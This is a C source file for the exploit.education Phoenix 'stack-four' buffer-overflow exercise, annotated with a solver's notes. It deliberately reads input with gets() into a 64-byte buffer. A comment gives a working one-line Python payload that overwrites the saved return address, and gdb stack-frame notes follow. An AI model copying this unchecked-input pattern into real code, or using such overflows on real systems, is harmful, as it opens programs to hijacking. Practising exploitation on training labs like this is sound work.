/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to Stack four, brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished stack four :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(void) {
  printf("%s\n", BANNER);
  start_level();
}
/******* exploit *****
 python2 -c 'print("A"*88+"\xa9\x51\x55\x55\x55\x55")' | ./stack-four
*/


/**
Stack level 0, frame at 0x7fffffffdc90:

 rip = 0x5555555551d6 
saved rip = 0x555555555229
called by frame at 0x7fffffffdca0
Arglist at 0x7fffffffdc80, args: 
Locals at 0x7fffffffdc80,
Previous frame's sp is 0x7fffffffdc90
Saved registers:

rip at 0x7fffffffdc88
rbp at 0x7fffffffdc80


*/

/**

called by frame at 140737488346272 //caller is higher on stack

Previous frame's sp is 140737488346256
3. rip = 140737488346256                ; rip pointer to top of caller
2. rip at 140737488346248
1. rbp at 140737488346240

Arglist at 140737488346240, args: 
Locals at 140737488346240,
saved rip = 93824992236073

*/